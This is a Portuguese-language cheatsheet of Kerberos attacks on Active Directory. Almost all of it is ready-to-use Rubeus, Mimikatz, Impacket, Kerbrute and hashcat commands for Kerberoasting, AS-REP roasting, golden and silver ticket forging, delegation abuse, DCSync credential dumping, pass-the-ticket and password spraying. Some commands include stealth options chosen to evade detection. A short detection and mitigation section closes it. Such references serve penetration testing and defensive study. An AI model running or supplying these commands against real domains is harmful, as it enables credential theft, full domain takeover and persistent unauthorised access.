---
layout: cyber
section: cheatsheets
title: "Kerberos Ataques — Cheatsheet"
---

# Kerberos Ataques — Cheatsheet

> Referencia rapida de ataques Kerberos em ambientes Active Directory.
> Todos os comandos prontos para uso, Rubeus (Windows) e Impacket (Linux) lado a lado.

---

## 1. KERBEROASTING

### Enumeracao de SPNs

```powershell
# PowerView
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName
Get-DomainUser -SPN -Properties SamAccountName,ServicePrincipalName,MemberOf

# LDAP nativo
setspn -T domain.local -Q */*
setspn -L svc_sql
```

### Rubeus — Kerberoasting

```cmd
# Dump basico de todos os tickets kerberoastaveis
Rubeus.exe kerberoast /outfile:hashes.txt

# Formato hashcat direto
Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# Opsec: solicita apenas RC4 (evita deteccao de downgrade)
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# Com delegacao TGT (mais stealth, usa TGT existente para pedir TGS)
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt

# Estatisticas de contas kerberoastaveis (sem solicitar ticket)
Rubeus.exe kerberoast /stats

# Alvo especifico
Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt /format:hashcat

# Sem quebra de linha no output
Rubeus.exe kerberoast /nowrap

# Combinado: stealth + formato hashcat
Rubeus.exe kerberoast /tgtdeleg /rc4opsec /format:hashcat /outfile:hashes.txt /nowrap
```

### Impacket — GetUserSPNs.py

```bash
# Com credenciais — solicita TGS e salva
GetUserSPNs.py domain.local/user:Password123 -request -outputfile hashes.txt

# Com hash NTLM (Pass-the-Hash)
GetUserSPNs.py domain.local/user -hashes :NTLM_HASH -request -outputfile hashes.txt

# Apenas listar SPNs (sem solicitar ticket)
GetUserSPNs.py domain.local/user:Password123

# Especificar DC
GetUserSPNs.py domain.local/user:Password123 -dc-ip 192.168.1.10 -request -outputfile hashes.txt

# Usuario especifico
GetUserSPNs.py domain.local/user:Password123 -request-user svc_sql
```

### Formato dos Hashes Kerberoast

```
# RC4 — hashcat modo 13100
$krb5tgs$23$*user$domain.local$SPN*$HASH_PARTE1$HASH_PARTE2...

# AES256 — hashcat modo 19600
$krb5tgs$18$*user$domain.local$SPN*$HASH_PARTE1$HASH_PARTE2...
```

### Hashcat — Kerberoasting

```bash
# RC4 (etype 23) — modo 13100
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES256 (etype 18) — modo 19600
hashcat -m 19600 hashes.txt /usr/share/wordlists/rockyou.txt

# Ataque hibrido
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# Mostrar senhas ja crackadas
hashcat -m 13100 hashes.txt --show
```

---

## 2. AS-REP ROASTING

> Usuarios com "Do not require Kerberos preauthentication" habilitado sao vulneraveis.

### Enumeracao

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | Select SamAccountName
Get-DomainUser -PreauthNotRequired -Properties SamAccountName,MemberOf,Description

# LDAP nativo
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

### Rubeus — AS-REP Roast

```cmd
# Todos os usuarios vulneraveis
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Sem quebra de linha
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap

# Usuario especifico
Rubeus.exe asreproast /user:john /format:hashcat /outfile:asrep.txt

# Especificar DC
Rubeus.exe asreproast /domain:domain.local /dc:DC01 /format:hashcat /outfile:asrep.txt
```

### Impacket — GetNPUsers.py

```bash
# Sem credenciais (precisa de lista de usuarios)
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass

# Com credenciais (enumera automaticamente)
GetNPUsers.py domain.local/user:Password123 -format hashcat -outputfile asrep.txt

# Com hash NTLM
GetNPUsers.py domain.local/user -hashes :NTLM_HASH -format hashcat -outputfile asrep.txt

# Especificar DC
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.10 -format hashcat -outputfile asrep.txt
```

### Formato do Hash AS-REP

```
# AS-REP hash — hashcat modo 18200
$krb5asrep$23$user@domain.local:HASH_PARTE1$HASH_PARTE2...
```

### Hashcat — AS-REP Roasting

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 18200 asrep.txt --show
```

---

## 3. GOLDEN TICKET

> Forja TGTs usando o hash krbtgt. Acesso total ao dominio. Valido por 10 anos por padrao.
> Persiste mesmo apos reset de senha de usuarios (invalidado apenas rotacionando krbtgt 2x).

### Extrair hash krbtgt

```
# Mimikatz — DCSync (requer DA ou Replication Rights)
lsadump::dcsync /user:DOMAIN\krbtgt
lsadump::dcsync /domain:domain.local /user:krbtgt

# Secretsdump (remoto, com credenciais)
secretsdump.py domain.local/Administrator:Password@DC01 -just-dc-user krbtgt

# Secretsdump com hash NTLM
secretsdump.py -hashes :NTLM_HASH domain.local/Administrator@DC01 -just-dc-user krbtgt
```

### Coletar informacoes necessarias

```powershell
# SID do dominio
Get-ADDomain | Select DomainSID
whoami /user        # Ex: S-1-5-21-XXXXX-XXXXX-XXXXX-1001 -> SID = S-1-5-21-XXXXX-XXXXX-XXXXX

# PowerView
Get-DomainSID
```

### Mimikatz — Criar Golden Ticket

```
# Injeta o ticket na sessao atual (/ptt = pass-the-ticket)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_NTLM_HASH /id:500 /groups:512 /ptt

# Grupos importantes: 512=Domain Admins, 513=Domain Users, 518=Schema Admins, 519=Enterprise Admins, 520=Group Policy Creator Owners
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_NTLM_HASH /id:500 /groups:512,513,518,519,520 /ptt

# Salvar em arquivo .kirbi
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_NTLM_HASH /id:500 /groups:512 /ticket:golden.kirbi

# Parametros opcionais OPSEC:
# /startoffset:-10  (minutos antes da hora atual — evita deteccao de ticket futuro)
# /endin:600        (validade em minutos, default 10 anos)
# /renewmax:10080   (renovacao maxima em minutos)
```

### Impacket — Criar Golden Ticket

```bash
# Criar ticket ccache
ticketer.py -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local Administrator

# Com grupos adicionais
ticketer.py -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local -groups 512,513,518,519,520 Administrator

# Com extra-sid (cross-domain, Enterprise Admins)
ticketer.py -nthash KRBTGT_HASH -domain-sid CHILD_SID -domain child.domain.local -extra-sid PARENT_SID-519 Administrator

# Saida: Administrator.ccache
```

### Usar o Golden Ticket

```bash
# Linux — exportar ccache e usar ferramentas Impacket
export KRB5CCNAME=Administrator.ccache

psexec.py -k -no-pass domain.local/Administrator@DC01
wmiexec.py -k -no-pass domain.local/Administrator@DC01
smbexec.py -k -no-pass domain.local/Administrator@DC01
secretsdump.py -k -no-pass domain.local/Administrator@DC01

# Windows — injetar kirbi com Mimikatz
kerberos::purge
kerberos::ptt golden.kirbi
klist
dir \\DC01\C$
psexec.exe \\DC01 cmd.exe

# Windows — injetar com Rubeus
Rubeus.exe ptt /ticket:golden.kirbi
Rubeus.exe ptt /ticket:BASE64_DO_TICKET
```

---

## 4. SILVER TICKET

> Forja TGS para servico especifico usando hash da conta de maquina ou servico.
> Mais silencioso: nao contata o KDC para validar (sem eventos no DC).

### Extrair hash da conta de maquina/servico

```
# Mimikatz — DCSync
lsadump::dcsync /user:DOMAIN\SERVER$
lsadump::dcsync /user:DOMAIN\svc_mssql

# Secretsdump
secretsdump.py domain.local/Administrator:Password@SERVER01

# Mimikatz local (se tiver acesso ao servidor alvo)
sekurlsa::logonpasswords
```

### Mimikatz — Criar Silver Ticket

```
# CIFS — acesso a shares SMB
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:server.domain.local /service:cifs /rc4:MACHINE_NTLM_HASH /ptt

# HTTP — WinRM, IIS
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:server.domain.local /service:http /rc4:MACHINE_NTLM_HASH /ptt

# HOST — tarefas agendadas, servicos remotos, PsExec
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:server.domain.local /service:host /rc4:MACHINE_NTLM_HASH /ptt

# LDAP — acesso LDAP autenticado (DCSync via Silver)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:DC01.domain.local /service:ldap /rc4:DC_NTLM_HASH /ptt

# MSSQL
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:sqlserver.domain.local /service:MSSQLSvc /rc4:SVC_HASH /ptt

# WSMAN — PowerShell Remoting
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:server.domain.local /service:wsman /rc4:MACHINE_NTLM_HASH /ptt

# RPCSS — WMI
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:server.domain.local /service:rpcss /rc4:MACHINE_NTLM_HASH /ptt
```

### Servicos Comuns para Silver Ticket

| Servico | SPN         | Acesso                        |
|---------|-------------|-------------------------------|
| cifs    | cifs/SERVER | SMB shares, dir remoto        |
| http    | http/SERVER | WinRM, IIS                    |
| host    | host/SERVER | Tarefas agendadas, SC, PsExec |
| ldap    | ldap/DC     | Consultas LDAP, DCSync        |
| MSSQLSvc| MSSQLSvc/   | SQL Server                    |
| wsman   | wsman/      | PowerShell Remoting           |
| rpcss   | rpcss/      | WMI                           |
| krbtgt  | krbtgt/     | Apenas Golden Ticket          |

---

## 5. S4U2SELF / S4U2PROXY (Constrained Delegation Abuse)

### Identificar contas com delegacao

```powershell
# PowerView — delegacao restrita (constrained)
Get-DomainUser -TrustedToAuth | Select SamAccountName, 'msDS-AllowedToDelegateTo'
Get-DomainComputer -TrustedToAuth | Select SamAccountName, 'msDS-AllowedToDelegateTo'

# LDAP nativo
Get-ADUser -Filter {TrustedForDelegation -eq $true}
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation,msDS-AllowedToDelegateTo
```

### Fluxo S4U Explicado

```
1. S4U2Self — conta de servico solicita TGS para si mesma em nome do usuario alvo:
   SVC_ACCOUNT -> KDC: "Quero TGS de Administrator -> SVC_ACCOUNT"
   KDC retorna: TGS (impersonating Administrator)

2. S4U2Proxy — usa TGS do passo 1 para solicitar acesso ao servico final:
   SVC_ACCOUNT + TGS_S4U2Self -> KDC: "Quero acesso a cifs/TARGET como Administrator"
   KDC valida delegacao e retorna: TGS (Administrator -> cifs/TARGET)

3. Apresenta o TGS final ao servico alvo — autentica como Administrator
```

### Rubeus — S4U2Self + S4U2Proxy

```cmd
# Fluxo completo com senha
Rubeus.exe s4u /user:SVC_ACCOUNT /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /ptt

# Com AES256
Rubeus.exe s4u /user:SVC_ACCOUNT /aes256:AES_HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /ptt

# Salvar ticket ao inves de injetar
Rubeus.exe s4u /user:SVC_ACCOUNT /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /outfile:ticket.kirbi

# ALTSERVICE — servico alternativo (quando cifs nao esta na lista mas host esta)
Rubeus.exe s4u /user:SVC_ACCOUNT /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:host/TARGET.domain.local /altservice:cifs /ptt

# Usando TGT existente (base64)
Rubeus.exe s4u /ticket:TGT_BASE64 /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /ptt
```

### Impacket — getST.py

```bash
# Solicitar service ticket via S4U com senha
getST.py -spn cifs/TARGET.domain.local -impersonate Administrator domain.local/SVC_ACCOUNT:Password123

# Com hash NTLM
getST.py -spn cifs/TARGET.domain.local -impersonate Administrator -hashes :NTLM_HASH domain.local/SVC_ACCOUNT

# Com AES Key
getST.py -spn cifs/TARGET.domain.local -impersonate Administrator -aesKey AES256_KEY domain.local/SVC_ACCOUNT

# Usar o ccache gerado
export KRB5CCNAME=Administrator@cifs_TARGET.ccache
psexec.py -k -no-pass domain.local/Administrator@TARGET
secretsdump.py -k -no-pass domain.local/Administrator@TARGET
```

---

## 6. DCSYNC

> Replica credenciais do DC sem acesso fisico.
> Requer: Domain Admins, Domain Controllers group, ou "Replicating Directory Changes All" ACE.

### Mimikatz — DCSync

```
# Hash de usuario especifico
lsadump::dcsync /domain:domain.local /user:Administrator
lsadump::dcsync /domain:domain.local /user:DOMAIN\krbtgt

# Dump de todos os usuarios (modo CSV — mais discreto em quantidade)
lsadump::dcsync /domain:domain.local /all /csv

# Especificar DC origem
lsadump::dcsync /domain:domain.local /user:krbtgt /dc:DC01.domain.local
```

### Secretsdump.py — DCSync remoto

```bash
# Dump de tudo (NTLM + Kerberos keys + LSA secrets)
secretsdump.py domain.local/Administrator:Password@DC01

# Apenas NTLM (mais rapido, menos ruido)
secretsdump.py domain.local/Administrator:Password@DC01 -just-dc-ntlm

# Usuario especifico
secretsdump.py domain.local/Administrator:Password@DC01 -just-dc-user krbtgt
secretsdump.py domain.local/Administrator:Password@DC01 -just-dc-user Administrator

# Com hash NTLM (PtH)
secretsdump.py -hashes :NTLM_HASH domain.local/Administrator@DC01 -just-dc-ntlm

# Via Kerberos (ccache)
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass domain.local/Administrator@DC01 -just-dc-ntlm
```

---

## 7. PASS-THE-TICKET

### Windows — Mimikatz

```
# Listar tickets na sessao atual
kerberos::list

# Exportar todos os tickets para arquivos .kirbi
kerberos::list /export

# Injetar ticket .kirbi
kerberos::ptt ticket.kirbi

# Injetar multiplos
kerberos::ptt *.kirbi

# Purgar tickets da sessao
kerberos::purge
```

### Windows — Rubeus

```cmd
# Injetar ticket kirbi
Rubeus.exe ptt /ticket:ticket.kirbi

# Injetar ticket em base64 (output do dump do Rubeus)
Rubeus.exe ptt /ticket:BASE64_TICKET

# Listar todos os tickets
Rubeus.exe klist

# Dump de tickets em base64 (sessao atual)
Rubeus.exe dump

# Dump de ticket especifico por LUID
Rubeus.exe dump /luid:0x1234567

# Dump por servico
Rubeus.exe dump /service:krbtgt

# Monitor de novos tickets (util em Unconstrained Delegation abuse)
Rubeus.exe monitor /interval:5 /nowrap
```

### Linux — ccache

```bash
# Usar ticket
export KRB5CCNAME=/path/to/ticket.ccache

# Listar tickets no ccache
klist

# Destruir tickets
kdestroy

# Verificar tickets com tipo de encriptacao
klist -e

# Usar sem exportar (inline)
KRB5CCNAME=/path/to/ticket.ccache psexec.py -k -no-pass domain.local/user@TARGET
```

---

## 8. CONVERSAO DE TICKETS (kirbi <-> ccache)

```bash
# kirbi -> ccache (Impacket)
ticketConverter.py ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# ccache -> kirbi
ticketConverter.py ticket.ccache ticket.kirbi

# Decodificar base64 do Rubeus para kirbi
echo "BASE64_STRING" | base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache

# Python one-liner para decodificar base64 Rubeus
python3 -c "import base64,sys; open('ticket.kirbi','wb').write(base64.b64decode(sys.argv[1]))" "BASE64_STRING"

# Usar o ccache
export KRB5CCNAME=ticket.ccache
klist
```

---

## 9. KERBRUTE

### Enumeracao de usuarios (sem bloqueio de conta)

```bash
# Enumerar usuarios validos
kerbrute userenum --dc DC01 -d domain.local users.txt
kerbrute userenum --dc 192.168.1.10 -d domain.local /usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Salvar resultado
kerbrute userenum --dc DC01 -d domain.local users.txt -o valid_users.txt

# Ajustar threads
kerbrute userenum --dc DC01 -d domain.local users.txt -t 50
```

### Password Spray (CUIDADO com lockout!)

```bash
# Verificar politica ANTES do spray
Get-ADDefaultDomainPasswordPolicy
net accounts /domain
crackmapexec smb DC01 --pass-pol

# Spray com senha unica
kerbrute passwordspray --dc DC01 -d domain.local users.txt 'Password123!'
kerbrute passwordspray --dc DC01 -d domain.local valid_users.txt 'Welcome1'
kerbrute passwordspray --dc DC01 -d domain.local valid_users.txt 'Summer2024!'
```

### Brute Force de usuario especifico

```bash
kerbrute bruteuser --dc DC01 -d domain.local passwords.txt john.doe
```

---

## 10. CONFIGURACAO LINUX PARA KERBEROS

### /etc/krb5.conf

```ini
[libdefaults]
    default_realm = DOMAIN.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true
    rdns = false
    noaddresses = true

[realms]
    DOMAIN.LOCAL = {
        kdc = DC01.domain.local
        admin_server = DC01.domain.local
    }

[domain_realm]
    .domain.local = DOMAIN.LOCAL
    domain.local = DOMAIN.LOCAL
```

### Comandos kinit / klist

```bash
# Obter TGT
kinit user@DOMAIN.LOCAL

# Usando keytab
kinit -k -t user.keytab user@DOMAIN.LOCAL

# Verificar tickets
klist
klist -e    # com tipo de encriptacao
klist -f    # com flags

# Renovar ticket
kinit -R

# Destruir todos os tickets
kdestroy
```

---

## 11. REFERENCIA RAPIDA — MODOS HASHCAT

| Modo  | Tipo                  | Ferramenta de Origem          |
|-------|-----------------------|-------------------------------|
| 13100 | Kerberoast RC4        | Rubeus kerberoast / GetUserSPNs |
| 19600 | Kerberoast AES256     | Rubeus kerberoast / GetUserSPNs |
| 18200 | AS-REP Roast          | Rubeus asreproast / GetNPUsers  |
| 1000  | NTLM                  | Mimikatz, secretsdump           |
| 5600  | NTLMv2                | Responder, ntlmrelayx           |
| 2100  | DCC2 (MSCachev2)      | Cached credentials              |
| 22000 | WPA2 PBKDF2           | Aircrack, wireless              |

---

## 12. DETECCAO — RED TEAM AWARENESS

```
Kerberoasting:
  Evento 4769 — EncryptionType=0x17 (RC4) e volume alto de TGS requests
  Mitigacao: senhas longas/complexas em service accounts, usar AES256 obrigatorio

AS-REP Roasting:
  Evento 4768 — PreAuthentication=0 em logons
  Mitigacao: habilitar pre-autenticacao para todos os usuarios sem excecao

DCSync:
  Evento 4662 — ACE "Replicating Directory Changes" com objeto de replicacao
  Mitigacao: restringir permissoes de replicacao, alertar qualquer conta nao-DC com esse direito

Golden Ticket:
  Evento 4768 — ticket lifetime > 10 horas, de IP incomum, sem AS-REQ precedente
  Mitigacao: rotacionar senha krbtgt 2x seguidas (invalida todos os TGTs existentes)

Silver Ticket:
  Nenhum evento no DC (ticket criado completamente offline)
  Mitigacao: PAC validation (ValidateKdcPacSignature), monitorar acesso sem TGT correspondente
```
